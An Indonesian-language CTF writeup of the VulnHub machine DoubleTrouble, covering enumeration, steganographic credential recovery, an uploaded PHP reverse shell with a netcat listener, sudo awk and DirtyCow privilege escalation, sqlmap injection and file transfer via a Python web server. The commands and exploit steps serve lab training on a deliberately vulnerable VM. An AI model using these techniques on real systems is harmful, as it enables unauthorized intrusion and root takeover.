---
title: "Writeup Machine DoubleTrouble VulnHub"
author: Ibnu Ubaeydillah
layout: post
comments: true
permalink: /Writeup-Machine-DoubleTrouble-VulnHub/
tags: [writeup, all-post]
---
Halo, semuanya. ini adalah tulisan writeup pertama kali yang saya buat di blog ini, semoga tulisan yang saya buat dapat dipahami oleh temen-temen. apabila ada kalimat yang kurang dimengerti dalam tulisan ini, temen-temen bisa tanyakan ke twitter saya, yaitu [@xcore13x](https://twitter.com/xcore13x). Pada writeup yang saya buat ini, akan membahasa tentang mesin [DoubleTrouble](#) mesin tersebut saya ambil dari [Vulnhub.com](https://vulnhub.com). untuk temen-temen yang ingin juga mengikuti tulisan ini sambil mempraktekannya. sebelumnya temen-temen silakan baca pada tulisan [Cara Install Lab Hacking Sendiri di Virtualbox](#).
<br>
``Mesin DoubleTrouble`` adalah mesin yang mempunyai 2 challenge, jadi akan terdapat 2x challenge berbeda-beda pada satu mesin ini. Sehingga memberikan sebuah tantangan yang cukup sulit.
<h3>Enumerate</h3>
Yang pertama saya lakukan adalah proses enumerate bertujuan melakukan pengecekan teknologi apa yang digunakan, Berikut teknologi yang digunakan pada ``Mesin DoubleTrouble``:
- PHP
- dqPM 9.1
- Apache 2.4.38
- Debian
- Bootstrap 3
- Jquery
- Font Awesome
<br>
Selanjutnya scanning port menggunakan ``nmap`` dengan menggunakan perintah ``sudo nmap -sV -vv doubletrouble.vulhub`` digunakan untuk milihat ``port apa saja yang digunakan dan terbuka``.
```
Nmap scan report for doubletrouble.vulhub (192.168.43.73)
Host is up, received arp-response (0.011s latency).
Scanned at 2022-08-10 06:46:37 WIB for 6s
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.38 ((Debian))
MAC Address: 08:00:27:36:5C:07 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Kemudian saya menggunkan tool yang bernama ``Gobuster`` digunakan untuk membrute force directory dan file pada target. dengan menggunakan ``Gobuster`` ini kita dapat menganalisa isi dari si target, meskipun tidak semuanya dapat terlihat. Bagi temen-temen yang ingin mempunyai ``Wordlist`` seperti saya. Temen-temen bisa download disini [Seclists](https://github.com/danielmiessler/SecLists).
```
gobuster dir -u doubletrouble.vulhub -w /usr/share/seclists/Discovery/Web-Content/common.txt
```
<img src="https://user-images.githubusercontent.com/28418984/183912262-e20d77bd-fff2-4cd0-83ec-2aa2b2327630.png">
Disini saya terfokus pada directory ``/secret`` dan setelah saya buka ternyata berisi sebuah gambar.
<center>
<img src="https://user-images.githubusercontent.com/28418984/183913381-49e10937-0055-40f1-b993-f8842782609e.png">
</center>
<br>disini saya memiliki kecurigaan yang tinggi, karena nama dari direktory tersebut. ahirnya kemudian saya mencoba membruteforce gambar tersebut menggunkan ``steganography``.
```
stegseek doubletrouble.jpg /usr/share/wordlists/rockyou.txt
```
dan menghasilkan hasil yang mengejutkan, ternyata terdapat sebuah ``email`` dan ``passwordnya`` di dalam gambar tersebut.
<br>
<center>
<img src="https://user-images.githubusercontent.com/28418984/183914631-37cde721-043d-430b-a2bb-15e062566685.png">
<img src="https://user-images.githubusercontent.com/28418984/183915406-0fe10c58-c341-4b89-b6cf-198f2109343b.png">
</center>
<br>
Kemudian saya gunakan ``Email`` dan ``Password`` yang telah saya dapatkan tadi untuk login.'
```
Email    : otisrush@localhost.com
Password : otis666
```
<img src="https://user-images.githubusercontent.com/28418984/183915899-e8bcd651-d218-49b6-8170-827909723b75.png">
dan ternyata berhasil ``Login``
<img src="https://user-images.githubusercontent.com/28418984/183916641-250644ae-a7cc-4537-b921-da43f668846a.png">
<h3>Exploit/Reverse Shell</h3>
Kemudian saya mengecek kembali hasil dari brute force direktory tadi dan ternyata ada direktory ``/uploads``. ahirnya saya mengunjungi direktory tersebut. Tetapi disana terdapat ``2 Folder``. bisa dipastikan folder tersebut adalah tempat penyimpanan file hasil upload. Saya melanjutkan proses enumerate pada target yang sudah login dan memahami terdapat fitur apa saja. Ternyata ada sebuah fitur untuk ``mengupload gambar`` pada halaman ``http://doubletrouble.vulhub/index.php/myAccount``. Ahirnya saya terpikirkan untuk ``mengreverse shell``, dengan cara mengupload ``exloit`` kedalam website tersebut. Untuk file yang saya gunakan untuk ``mengreverse shell`` saya download di sini [https://github.com/pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell), tetapi saya mengeditnya terlebih dahulu, yaitu dengan mengganti ``IP`` dan ``PORT`` yang akan digunakan. Setelah ``IP`` dan ``PORT`` sudah di ganti dan disave.
<center>
<img src="https://user-images.githubusercontent.com/28418984/183919349-c93a6364-1aa0-4241-9afb-fe446ea772aa.png">
</center>
<br>
Kita jalankan perintah ``nc -nlvp 4444``, digunakan untuk menerima respon dari shell, yang berhasil kita ``upload``.
<img src="https://user-images.githubusercontent.com/28418984/183920372-b757af26-93a8-4427-8cc0-98a531b8abb3.png">
Setelah shell berhasil kita upload, silakan kalian cek pada direktory ``http://doubletrouble.vulhub/uploads/users/`` dan disana kalian akan melihat ``shell`` yang berhasil di upload. Langkah selanjutnya yaitu kalian ``klik`` file shell tersebut dan dengan sendirinya ``netcat`` akan merespon file tersebut masuk kedalam sebuah ``shell``.
<img src="https://user-images.githubusercontent.com/28418984/183931003-129f4853-adeb-4afa-b8ab-0dd7dbce7b3a.png">
Sekarang kita mengupgrade shell dengan cara memasukan perintah ``python3 -c 'import pty;pty.spawn("/bin/bash")'``. Untuk yang masih kebingunan tentang ``upgrade shell`` temen-temen bisa baca disini [https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/](https://nepcodex.com/2021/06/upgrade-to-an-intelligent-reverse-shell/)
Kemudian saya mengecek ``privilege escalation`` pada user ``www-data@doubletrouble`` dengan memasukan perintah ``sudo -l``
<center>
<img src="https://user-images.githubusercontent.com/28418984/183923191-c825a6c4-8032-4d5d-a1e5-c005948137ee.png"> 
</center>
ternyata bisa menjalakan perintah ``root`` pada ``/usr/bin/awk/``. saya mencoba menaikan hak akses user dengan perintah ``sudo awk 'BEGIN {system("/bin/bash")}'``. Untuk temen-temen yang mencari referensi menaikan hak akses user, saya sarankan temen-temen baca di sini [https://gtfobins.github.io/gtfobins/awk/#sudo](https://gtfobins.github.io/gtfobins/awk/#sudo) karena disitu sangat lengkap sekali. 
<center>
<img src="https://user-images.githubusercontent.com/28418984/183924376-6e6c6e78-1508-4708-bbde-f69fe7aec6bb.png">
</center>
sekarang kita berhasil menaikan ke user ``root``, kemudian saya pergi ke direktory ``/root`` dan menemukan file ``doubletrouble.ova``. Saya coba download file tersebut dengan cara menjalankan perintah ``python3 -m http.server`` agar saya dapat menyimpan dan mendownload file ``doubletrouble.ova`` ke local. lalu saya memasukan perintah ``wget IP_MESIN:8000/doubletrouble.ova/`` maka akan secara otomatis mendownload sendirinya. 
<center>
<img src="https://user-images.githubusercontent.com/28418984/183929929-00c2d704-3993-4267-9522-34dbdf97d3be.png">
<img src="https://user-images.githubusercontent.com/28418984/183933207-a467412c-880a-4db8-845f-45b6b924a8b0.png">
</center>
Ahirnya saya jalankan file ``doubletrouble.ova`` menggunakan VM dan ternyata setelah dijalakan menampilkan halaman login.
<center>
<img src="https://user-images.githubusercontent.com/28418984/183938582-99483b4c-695f-432a-947c-718e7bec4089.png">
</center>
pada halaman tersebut membutuhkan ``Username`` dan ``Password`` untuk login. Saya disini mencoba menggunakan tool ``sqlmap`` untuk mendapatkan ``Username`` dan ``Passwordnya`` dan ternyata memang benar bisa dilakukan inject sql.
<img src="https://user-images.githubusercontent.com/28418984/183940638-bb5a57be-3903-403b-9d23-6878aeb8e543.png">
setelah saya mencoba login ke website tersebut menggunakan username dan password yang saya dapatkan namun tidak bisa. ahirnya saya berpikir kembali dan mencoba login menggunakan ``SSH``, ternyata berhasil login menggunakan user ``clapton``.
<center>
<img src="https://user-images.githubusercontent.com/28418984/183942059-f5290dbf-eac7-4c4f-abd8-b6e92f0e7e39.png">
</center>
Kemudian saya menaikan hak akses user menggunakan exploit yang saya download di [https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c](https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c) dan menjalankannya dengan perintah ``gcc -pthread dirty.c -o dirty -lcrypt``, maka akan secara otomatis menghasilkan output file yang bernama ``dirty``. Sekarang jalankan perintah ``./dirty`` secara otomatis akan dibuatkan password user root baru. Silakan temen-temen bebas bisa menggunakan password apapun.
<img src="https://user-images.githubusercontent.com/28418984/183944558-ba447889-671d-4644-ac88-023e33c50fcc.png">
Sekarang lakukan login menggunakan user ``firefart@doubletrouble`` dan password yang dibuat tadi.
<center>
<img src="https://user-images.githubusercontent.com/28418984/183944995-1b2507bd-2107-4327-9fb9-ff071d4fb828.png">
</center>
dan berhasil masuk. Cukup sekian pada tulisan kali ini, semoga tulisan ini dapat dipahami oleh temen-temen. bila ada kalimat yang kurang jelas atau berkenan saya mohon maaf dan bila ada suatu kalimat yang temen-temen belum jelas, bisa DM twitter saya ``@xcore13x``. Terima kasih.